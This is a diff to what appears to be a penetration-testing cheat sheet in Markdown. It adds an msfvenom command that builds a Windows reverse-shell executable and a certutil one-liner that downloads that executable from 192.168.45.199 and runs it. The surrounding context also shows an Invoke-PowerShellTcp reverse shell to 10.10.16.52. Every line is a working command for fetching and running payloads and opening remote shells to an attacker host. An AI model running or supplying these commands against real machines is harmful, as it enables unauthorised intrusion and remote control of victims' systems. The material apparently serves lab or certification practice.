@@ -312,8 +312,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.52 -Port 1337
 ```
 Crafting a .exe using msfvenom avoiding bad potential bad characters
 ```bash
-└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=443 -b '\x00\x01\x0d' -f exe -o revshell.exe
-
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=443 -b '\x00\x01\x0d' -f exe -o revshell.exe
+```
+Using Certutil to upload and execute files
+```bash
+certutil.exe -f -urlcache -split http://192.168.45.199:8000/revshell.exe c:\windows\temp\revshell.exe && cmd.exe /c c:\windows\temp\revshell.exe
 ```
 ### msfvenom
 ```bash
